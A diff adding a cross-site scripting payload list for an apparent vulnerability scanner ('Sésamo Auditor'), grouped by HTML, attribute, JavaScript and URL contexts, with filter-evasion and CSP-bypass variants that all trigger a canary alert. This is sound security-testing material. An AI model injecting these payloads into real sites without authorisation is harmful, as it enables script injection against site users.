@@ -1,0 +1,62 @@
+# ================================================================
+# Sésamo Auditor — Payloads de Cross-Site Scripting (XSS)
+# ================================================================
+# Cada payload contiene {CANARY} como placeholder que será
+# reemplazado en runtime por un token único para confirmar
+# reflexión exacta (ej: sesamo_xss_a7f3b2).
+# ================================================================
+
+# ─── XSS Básicos (HTML Context) ───
+<script>alert('{CANARY}')</script>
+<script>document.write('{CANARY}')</script>
+<img src=x onerror="alert('{CANARY}')">
+<img src=x onerror=alert('{CANARY}')>
+<svg onload="alert('{CANARY}')">
+<svg/onload=alert('{CANARY}')>
+<body onload="alert('{CANARY}')">
+<input onfocus="alert('{CANARY}')" autofocus>
+<marquee onstart="alert('{CANARY}')">
+<details open ontoggle="alert('{CANARY}')">
+<video><source onerror="alert('{CANARY}')">
+
+# ─── XSS en Atributos HTML ───
+" onmouseover="alert('{CANARY}')" x="
+' onmouseover='alert("{CANARY}")' x='
+" onfocus="alert('{CANARY}')" autofocus="
+"><script>alert('{CANARY}')</script>
+'><script>alert('{CANARY}')</script>
+"><img src=x onerror="alert('{CANARY}')">
+'><img src=x onerror='alert("{CANARY}")'>
+
+# ─── XSS con Encoding/Bypass de Filtros ───
+<ScRiPt>alert('{CANARY}')</ScRiPt>
+<SCRIPT>alert('{CANARY}')</SCRIPT>
+<scr<script>ipt>alert('{CANARY}')</scr</script>ipt>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('{CANARY}')">
+<img src=x onerror=alert&#40;'{CANARY}'&#41;>
+\x3cscript\x3ealert('{CANARY}')\x3c/script\x3e
+
+# ─── XSS en JavaScript Context ───
+';alert('{CANARY}');//
+";alert('{CANARY}');//
+\';alert('{CANARY}');//
+</script><script>alert('{CANARY}')</script>
+'-alert('{CANARY}')-'
+"-alert('{CANARY}')-"
+
+# ─── XSS en URL Context ───
+javascript:alert('{CANARY}')
+data:text/html,<script>alert('{CANARY}')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgne0NBTkFSWX0nKTwvc2NyaXB0Pg==
+
+# ─── XSS sin Script (CSP Bypass) ───
+<img src=x onerror=alert('{CANARY}')>
+<svg><animate onbegin=alert('{CANARY}') attributeName=x dur=1s>
+<math><mtext><table><mglyph><style><!--</style><img title="-->" src=x onerror=alert('{CANARY}')>
+
+# ─── Detección Simple (sin ejecución) ───
+{CANARY}
+<{CANARY}>
+"{CANARY}"
+'{CANARY}'
+<b>{CANARY}</b>
